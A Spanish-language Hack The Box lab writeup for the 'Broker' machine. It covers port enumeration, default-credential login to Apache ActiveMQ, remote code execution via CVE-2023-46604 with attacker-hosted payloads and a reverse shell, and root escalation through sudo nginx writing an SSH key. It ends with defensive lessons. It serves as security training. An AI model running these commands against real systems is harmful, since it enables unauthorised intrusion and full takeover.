# 🗂️ Writeup HTB — Broker

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.230.87
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración activa, lanzamos un ping para verificar conectividad con la máquina objetivo. El valor del **TTL** nos permite intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```bash
> ping -c 1 10.129.230.87
> ```
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.230.87` — **IP objetivo** a la que se lanza el ping.

![](assets/Broker-img-05-04-2026.png)

Obtenemos respuesta con un TTL de **63**, lo que confirma que estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos con la enumeración de puertos.

---

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

Comenzamos identificando qué puertos se encuentran abiertos sobre el rango completo de los 65535 posibles mediante un SYN Scan, que envía paquetes SYN sin completar el three-way handshake TCP — más rápido y menos ruidoso que un TCP Connect Scan completo.

> [!tip] Escaneo de puertos completo y sigiloso
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.230.87 -vvv -oN ports
> ```
> `-sS` — **SYN Scan** (half-open). Envía SYN, recibe SYN-ACK si el puerto está abierto o RST si está cerrado, sin completar nunca el handshake. Requiere privilegios de root.
> `-p-` — Escanea los **65535 puertos** posibles, desde el 1 hasta el 65535.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando los cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo** para acelerar el escaneo.
> `-n` — Sin resolución DNS — evita latencia adicional y ruido en la red.
> `-Pn` — Sin ping previo — asume el host activo aunque ICMP esté bloqueado.
> `10.129.230.87` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose** — muestra los puertos abiertos en tiempo real sin esperar al final.
> `-oN ports` — Guarda el output en formato legible en el archivo `ports`.

![](assets/Broker-img-05-04-2026-15.png)

El escaneo revela **nueve puertos abiertos**: `22` (SSH), `80` (HTTP), `1883` (MQTT), `5672` (AMQP), `8161`, `40749`, `61613`, `61614` y `61616`. La presencia de puertos como MQTT y AMQP es inusual y apunta directamente a un **broker de mensajería** — tecnología típica de entornos IoT e integración de sistemas.

---

#### 🔬 Enumeración de versiones y servicios

Con los puertos identificados, lanzamos un segundo escaneo apuntando únicamente a los puertos descubiertos para determinar qué servicios y versiones exactas corren en cada uno, ejecutando los scripts NSE por defecto para obtener información adicional.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```bash
> nmap -sC -sV -p22,80,1883,5672,8161,40749,61613,61614,61616 --min-rate 5000 -n -Pn -vvv 10.129.230.87 -oN version
> ```
> `-sC` — Lanza los **scripts por defecto** del motor NSE (Nmap Scripting Engine). Incluye detección de banners, enumeración básica de servicios y comprobaciones de configuraciones inseguras.
> `-sV` — **Detección de versiones** — envía probes adicionales para identificar el software exacto y su versión en cada puerto.
> `-p22,80,1883,5672,8161,40749,61613,61614,61616` — Escanea **únicamente los puertos descubiertos** en el paso anterior.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — **Triple verbose**.
> `10.129.230.87` — **IP objetivo**.
> `-oN version` — Guarda el output en el archivo `version`.

![](assets/Broker-img-05-04-2026-1.png)
![](assets/Broker-img-05-04-2026-2.png)
![](assets/Broker-img-05-04-2026-3.png)
![](assets/Broker-img-05-04-2026-4.png)

Los service fingerprints de los puertos de mensajería son especialmente reveladores. El stack trace del puerto `61613` expone explícitamente el software en ejecución:

> [!info] Service Fingerprint — Puerto 5672 (AMQP)
> ```
> amqp:decode-error
> Connection from client using unsupported AMQP attempted
> ```

> [!info] Service Fingerprint — Puerto 61613 (STOMP / Apache ActiveMQ)
> ```
> ERROR
> content-type: text/plain
> message: Unknown STOMP action: HELP
>
> org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
>     at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
>     at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
>     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
>     at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
>     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
>     at java.lang.Thread.run(Thread.java:750)
> ```

> [!important] El stack trace del puerto 61613 identifica inequívocamente el software como **Apache ActiveMQ**. Este es el hallazgo más valioso del escaneo — permite buscar CVEs y exploits específicos para esta tecnología.

---

### 🌐 Enumeración del servicio web — Puerto 80

Al acceder a `http://10.129.230.87` encontramos un panel de login que corresponde a la **consola de administración web de Apache ActiveMQ**:

![](assets/Broker-img-05-04-2026-5.png)

Las credenciales por defecto de Apache ActiveMQ son `admin:admin` — una configuración que nunca debería mantenerse en producción. Las probamos y el acceso tiene éxito:

![](assets/Broker-img-05-04-2026-6.png)

Con acceso al panel de administración, realizamos fuzzing para mapear toda la superficie web expuesta. Dado que el panel requiere autenticación básica HTTP, incluimos las credenciales en el comando de gobuster para que las peticiones sean autenticadas. Además, filtramos por código de respuesta `401` (no autorizado) y `404` (no encontrado), y excluimos respuestas con longitud `475` bytes que corresponde a la página de error por defecto del panel:

> [!tip] Fuzzing de directorios y archivos autenticado sobre el puerto 80
> ```bash
> gobuster dir -u http://10.129.230.87 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --no-error -x php,htm,html,csv,txt,xml --add-slash -t 40 -o fuzzing -xl 475 -b 401,404 -U admin -P admin
> ```
> `dir` — Modo de fuerza bruta de directorios y archivos en un servidor web.
> `-u http://10.129.230.87` — URL objetivo del escaneo.
> `-w .../DirBuster-2007_directory-list-2.3-medium.txt` — Wordlist en su variante medium para una búsqueda exhaustiva.
> `--no-error` — No muestra errores en el output, manteniendo la salida limpia.
> `-x php,htm,html,csv,txt,xml` — Añade extensiones de archivo a cada entrada de la wordlist.
> `--add-slash` — Añade barra final a cada petición para forzar detección de directorios.
> `-t 40` — 40 hilos en paralelo para acelerar el escaneo.
> `-o fuzzing` — Guarda los resultados en el archivo `fuzzing`.
> `-xl 475` — Excluye respuestas con exactamente 475 bytes de longitud — el tamaño de la página de error por defecto del panel, que genera falsos positivos.
> `-b 401,404` — Excluye respuestas con códigos HTTP 401 (no autorizado) y 404 (no encontrado).
> `-U admin -P admin` — Credenciales para autenticación HTTP básica — necesarias porque el panel requiere login.

![](assets/Broker-img-05-04-2026-7.png)

Gobuster descubre el directorio `/admin`. Al acceder encontramos información crítica sobre la versión del software:

![](assets/Broker-img-05-04-2026-8.png)

La versión instalada es **Apache ActiveMQ 5.15.15**, que es vulnerable a **CVE-2023-46604** — una vulnerabilidad crítica de ejecución remota de código. Con esta información tenemos todo lo necesario para pasar a la fase de explotación.

---

## 💥 Explotación

### 🔥 CVE-2023-46604 — Apache ActiveMQ RCE

> [!info] **CVE-2023-46604 — Apache ActiveMQ Remote Code Execution**
> Vulnerabilidad crítica (CVSS 10.0) en Apache ActiveMQ versiones anteriores a 5.15.16, 5.16.7, 5.17.6 y 5.18.3. El protocolo OpenWire de ActiveMQ, usado para la comunicación entre brokers y clientes, deserializa datos sin validación adecuada. Un atacante puede enviar un paquete malicioso al puerto `61616` que hace que el broker descargue y ejecute una clase Java arbitraria desde una URL controlada por el atacante — resultando en RCE sin autenticación previa.

Clonamos el repositorio del exploit:

> [!tip] Clonar el repositorio del exploit CVE-2023-46604
> ```bash
> git clone https://github.com/rootsecdev/CVE-2023-46604.git
> cd CVE-2023-46604
> ```

![](assets/Broker-img-05-04-2026-9.png)

El exploit requiere un archivo XML que define la clase Java maliciosa a descargar y ejecutar. Editamos `poc-linux.xml` para sustituir la IP por la de nuestra máquina atacante, que será quien sirva el payload:

> [!tip] Modificar el archivo XML del exploit con nuestra IP atacante
> ```bash
> nano poc-linux.xml
> # Cambiar la IP en la línea 11 de 0.0.0.0 a 10.10.16.8
> ```

![](assets/Broker-img-05-04-2026-10.png)

Con el XML modificado, preparamos el entorno en tres terminales simultáneas:

**Paso 1 — Servidor HTTP en el atacante para servir el XML:**

> [!tip] Levantar servidor HTTP para servir el payload XML
> ```bash
> # En el directorio del exploit
> python3 -m http.server 8081
> ```
> ActiveMQ descargará el `poc-linux.xml` desde este servidor cuando el exploit se ejecute. El puerto 8081 es arbitrario — puede ser cualquier puerto disponible.

**Paso 2 — Listener de netcat para recibir la reverse shell:**

> [!tip] Ponerse en escucha para recibir la reverse shell
> ```bash
> nc -lnvp 9001
> ```

**Paso 3 — Ejecutar el exploit:**

> [!tip] Lanzar el exploit contra el broker ActiveMQ
> ```bash
> # Dar permisos de ejecución al script Go
> chmod 755 main.go
>
> # Ejecutar el exploit
> go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.16.8:8081/poc-linux.xml
> ```
> `go run main.go` — Compila y ejecuta el exploit Go en un solo paso.
> `-i 10.129.230.87` — IP del broker ActiveMQ objetivo.
> `-p 61616` — Puerto del protocolo OpenWire — el vector de ataque del CVE.
> `-u http://10.10.16.8:8081/poc-linux.xml` — URL desde donde ActiveMQ descargará el payload XML malicioso. El broker hará una petición HTTP a nuestro servidor Python para obtenerlo.

![](assets/Broker-img-05-04-2026-11.png)

El exploit se ejecuta correctamente. En el listener de netcat recibimos la reverse shell:

![](assets/Broker-img-05-04-2026-12.png)

Somos el usuario **`activemq`**. La flag de usuario se encuentra en `/home/activemq/user.txt`.

---

## 🔼 Escalada de Privilegios

### ⚡ Escalada a root via sudo + nginx

El primer paso tras ganar acceso es verificar los permisos sudo del usuario actual:

> [!tip] Verificar permisos sudo del usuario activemq
> ```bash
> sudo -l
> ```

![](assets/Broker-img-05-04-2026-13.png)

El output revela:
```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Podemos ejecutar `nginx` como **cualquier usuario del sistema, incluido root**, sin necesidad de contraseña. Nginx es un servidor web que puede configurarse para servir archivos y ejecutar módulos — con permisos de root, esto permite leer archivos arbitrarios del sistema e incluso escribir claves SSH.

Usamos el script de explotación automática que aprovecha este vector:

**Paso 1 — Descargar el exploit en el atacante y transferirlo a la víctima:**

> [!tip] Descargar el script de explotación y transferirlo a la máquina víctima
> ```bash
> # En el atacante — descargar el script
> wget https://raw.githubusercontent.com/DylanGrl/nginx_sudo_privesc/main/exploit.sh
>
> # Levantar servidor HTTP para transferirlo
> python3 -m http.server 8080
>
> # En la víctima — descargar el script desde el atacante
> wget http://10.10.16.8:8080/exploit.sh
> chmod +x exploit.sh
> ```
> El servidor HTTP de Python sirve el script desde el directorio actual del atacante. La víctima lo descarga con `wget` apuntando a la IP del atacante y el puerto donde escucha el servidor.

**Paso 2 — Entender el flujo del script:**

> [!info] **Funcionamiento del exploit nginx sudo privesc**
> El script abusa del permiso sudo sobre nginx de la siguiente forma: crea una configuración de nginx temporal que lanza el proceso como root (`user root`), configura un servidor web que tiene acceso de lectura a todo el sistema de ficheros, y añade una clave SSH pública generada por el script al archivo `/root/.ssh/authorized_keys` — al que puede acceder porque nginx corre como root. Una vez la clave está añadida, el script la usa para conectarse por SSH al localhost como root sin necesitar contraseña.

**Paso 3 — Ejecutar el exploit:**

> [!tip] Ejecutar el script de escalada via nginx sudo
> ```bash
> ./exploit.sh
> ```

El script genera automáticamente un par de claves SSH, escribe la clave pública en `/root/.ssh/authorized_keys` usando nginx con permisos de root, y proporciona la clave privada para conectarse.

**Paso 4 — Conectar como root usando la clave generada:**

> [!tip] Acceder como root usando la clave SSH generada por el exploit
> ```bash
> ssh -i id_rsa root@localhost
> ```
> `-i id_rsa` — Clave privada generada por el exploit — su pareja pública fue escrita en `authorized_keys` de root por nginx corriendo como root.
> `root@localhost` — Conectamos como root al propio sistema local.

![](assets/Broker-img-05-04-2026-14.png)

Somos **root**. La flag de root se encuentra en `/root/root.txt`.

---

## 📝 Lecciones Aprendidas

**Las credenciales por defecto son el vector de entrada más sencillo.** `admin:admin` en Apache ActiveMQ es una configuración documentada públicamente que cualquier atacante probará en los primeros segundos. Cualquier software desplegado en producción debe tener sus credenciales por defecto cambiadas antes de ser expuesto en red.

**CVE-2023-46604 demuestra el peligro de la deserialización insegura.** La vulnerabilidad no requiere autenticación y afecta al protocolo de comunicación central de ActiveMQ — el puerto 61616 nunca debería ser accesible desde redes no confiables. ActiveMQ debe estar siempre detrás de un firewall que restrinja el acceso al broker únicamente a los clientes legítimos.

**sudo sobre nginx es una escalada directa a root.** Permitir que un usuario ejecute nginx con sudo equivale a darle acceso root completo — nginx puede configurarse para leer y escribir cualquier archivo del sistema, incluyendo claves SSH de root. Los permisos sudo deben seguir el principio de mínimo privilegio: solo el comando exacto necesario, nunca un binario tan flexible como un servidor web.

**Los brokers de mensajería son superficie de ataque frecuentemente ignorada.** ActiveMQ, RabbitMQ, Kafka y similares suelen desplegarse con configuraciones por defecto y escasa atención a la seguridad porque se perciben como infraestructura interna. Sin embargo, exponen múltiples puertos, procesan datos no confiables y frecuentemente corren con privilegios elevados — convirtiéndolos en objetivos de alto valor para un atacante que ya está dentro de la red.